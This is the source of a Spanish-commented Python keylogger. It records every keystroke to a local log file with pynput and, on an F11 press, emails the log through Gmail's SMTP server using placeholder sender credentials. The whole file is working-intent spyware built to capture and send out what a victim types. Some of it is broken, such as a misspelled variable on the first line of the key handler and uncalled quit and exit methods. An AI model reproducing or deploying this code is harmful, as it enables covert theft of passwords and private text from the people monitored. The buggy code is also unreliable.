from pynput.keyboard import Listener
from email.mime.multipart import MIMEMultipart
from email.mime.base import MIMEBase
from smtplib import SMTP
import sys

def enviar_correo():
    mensaje = MIMEMultipart("plain")
    mensaje["From"] = "tucorreo@gmail.com"
    mensaje["To"] = "destinatario@gmail.com"
    mensaje["Subject"] = "LOG DEL KEYLOGGER"

    adjunto = MIMEBase("application","octect-stream")
    adjunto.set_payload(open('log.txt','rb').read())
    adjunto.add_header("content-Disposition",'attachment; filename = "log.txt"')
    mensaje.attach(adjunto)

    server = SMTP("smtp.gmail.com:587")
    server.starttls()
    server.login("tucorreo@gmail.com", "tu_contraseña")
    server.sendmail("tucorreo@gmail.com", "destinatario@gmail.com", mensaje.as_string().encode('utf-8'))

    server.quit
    
def keyboard_listener(key):
    etter = str(key)
    letter = letter.replace("'","")
    if letter == "Key.space":
        letter = ' '
    elif letter == "Key.backspace":
        letter = '  '
    elif letter == "Key.left":
        #letter = '<-'
        letter = ''
    elif letter == "Key.right":
        #letter = '->'
        letter = ''
    elif letter == "Key.up":
        #letter = '[∧]'
        letter = ''
    elif letter == "Key.down":
        #letter = '[∨]'
        letter = ''
    elif letter == "Key.enter":
        letter = '[ENTER]\n'
    elif letter == "Key.shift_r":
        letter = ''    
    elif letter == "Key.shift_l":
        letter = '' 
    elif letter == "Key.ctrl_l":
        letter = ''     
    elif letter == "Key.ctrl_r":
        letter = ''  
    elif letter == "Key.caps_lock":
        letter = '[MAYUS]'  
    elif letter == "Key.alt_l":
        letter = ''  
    elif letter == "Key.alt_r":
        letter = ''  
    elif letter == "Key.tab":
        letter = ''  
    elif letter == "Key.shift":
        letter = '' 
    elif letter == "Key.f11":
        enviar_correo()
    elif letter == "Key.esc":
        sys.exit()
    
        
    with open("log.txt","a") as f:
        f.write(letter)

def main():
    print("(+) Se inicio el KeyLogger")
    with Listener(on_press=keyboard_listener) as l:
        l.join()


if __name__ == '__main__':
    try:
        main()
    except KeyboardInterrupt:
        sys.exit
        
